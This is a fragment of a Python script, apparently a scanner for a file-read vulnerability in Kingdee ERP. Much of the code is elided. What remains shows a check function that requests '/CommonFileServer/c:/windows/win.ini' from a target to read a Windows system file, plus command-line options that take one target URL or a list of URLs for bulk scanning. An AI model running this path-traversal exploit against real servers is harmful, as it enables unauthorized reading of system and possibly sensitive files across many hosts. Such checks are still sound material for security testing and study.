...
def check_vuln(url):
	...
	url2 = url.scheme + '://' + url.netloc + '/CommonFileServer/c:/windows/win.ini'
	try:
...
if __name__ == '__main__':
	...
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python Kingdee-erp_fileread.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:python Kingdee-erp_fileread.py -f url.txt")
